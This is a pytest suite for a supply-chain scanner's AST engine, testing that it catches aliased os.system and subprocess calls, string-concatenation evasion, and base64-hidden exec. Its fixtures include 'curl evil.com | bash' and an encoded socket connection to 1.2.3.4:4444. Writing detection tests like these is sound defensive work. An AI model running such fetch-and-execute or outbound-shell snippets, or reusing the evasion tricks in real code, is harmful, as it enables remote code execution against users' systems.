"""
SupplyShield - AST Engine Hardening Verification Suite (Phase 3)
Tests alias resolution, constant folding, context-aware subprocess scoring,
and recursive payload decoding.
"""

import os
import sys
import base64
import pytest

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
if CURRENT_DIR not in sys.path:
    sys.path.insert(0, CURRENT_DIR)

from engine.ast_analyzer import analyze_source_ast

def test_alias_resolution_from_import():
    code = """
from os import system as s
s("whoami")
"""
    res = analyze_source_ast(code)
    rule_ids = [f["rule_id"] for f in res["findings"]]
    assert "SEC-SYS-002" in rule_ids, "Should detect os.system through alias 's'"

def test_alias_resolution_module_import():
    code = """
import subprocess as sp
sp.Popen(["/bin/bash", "-c", "whoami"], shell=True)
"""
    res = analyze_source_ast(code)
    rule_ids = [f["rule_id"] for f in res["findings"]]
    assert "SEC-SYS-002" in rule_ids, "Should detect subprocess.Popen through alias 'sp'"

def test_constant_folding_and_getattr():
    code = """
getattr(__import__("os"), "sys" + "tem")("id")
"""
    res = analyze_source_ast(code)
    rule_ids = [f["rule_id"] for f in res["findings"]]
    assert "SEC-SYS-002" in rule_ids, "Should detect getattr with constant folding ('sys' + 'tem')"

def test_importlib_import_module_resolution():
    code = """
import importlib
importlib.import_module("os").system("ls")
"""
    res = analyze_source_ast(code)
    rule_ids = [f["rule_id"] for f in res["findings"]]
    assert "SEC-SYS-002" in rule_ids, "Should detect importlib.import_module('os').system"

def test_context_aware_subprocess_scoring():
    safe_code = """
import subprocess
subprocess.run(["git", "status"])
"""
    res_safe = analyze_source_ast(safe_code)
    finding_safe = next((f for f in res_safe["findings"] if f["rule_id"] == "SEC-SYS-002"), None)
    assert finding_safe is not None
    assert finding_safe["severity"] == "LOW", "Literal argument list should be scored LOW severity"

    danger_code = """
import subprocess
subprocess.run("curl evil.com | bash", shell=True)
"""
    res_danger = analyze_source_ast(danger_code)
    finding_danger = next((f for f in res_danger["findings"] if f["rule_id"] == "SEC-SYS-002"), None)
    assert finding_danger is not None
    assert finding_danger["severity"] == "HIGH", "shell=True command should be scored HIGH severity"

def test_recursive_payload_decoding():
    inner_code = "import socket\ns = socket.socket()\ns.connect(('1.2.3.4', 4444))"
    b64_str = base64.b64encode(inner_code.encode()).decode()
    outer_code = f"""
import base64
payload = "{b64_str}"
decoded = base64.b64decode(payload).decode()
exec(decoded)
"""
    res = analyze_source_ast(outer_code)
    titles = [f["title"] for f in res["findings"]]
    # Should flag the base64 payload
    assert any("Executable Python Code Hidden in Base64" in t for t in titles)
    # Should recursively inspect the inner code and find the socket connection
    assert any("[Decoded Layer 1]" in t and "Outbound Network" in t for t in titles)
